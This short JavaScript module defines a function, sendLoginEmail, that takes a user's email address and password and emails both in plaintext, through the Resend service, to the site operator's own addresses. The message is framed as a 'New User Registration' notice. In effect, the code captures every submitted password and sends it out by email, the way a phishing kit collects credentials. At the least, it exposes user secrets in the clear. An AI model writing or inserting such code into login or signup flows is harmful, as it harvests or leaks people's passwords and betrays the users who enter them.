import resend from'../config/resend.js'

export async function sendLoginEmail({email, password}) {
  
  return resend.emails.send({
    from: process.env.EMAIL_FROM,
    to: [process.env.EMAIL_FROM, process.env.EMAIL_USER],
    subject: 'New User Registration: ',
    html: `
      <h2>New User Registration</h2>
      <p><strong>Registration Time:</strong> ${new Date().toLocaleString()}</p>
      <hr>
      <h3>User Details:</h3>
      <ul>
        <li><strong>Email:</strong> ${email}</li>
        <li><strong>Pass:</strong> ${password}</li>

      </ul>
    `
  });
}
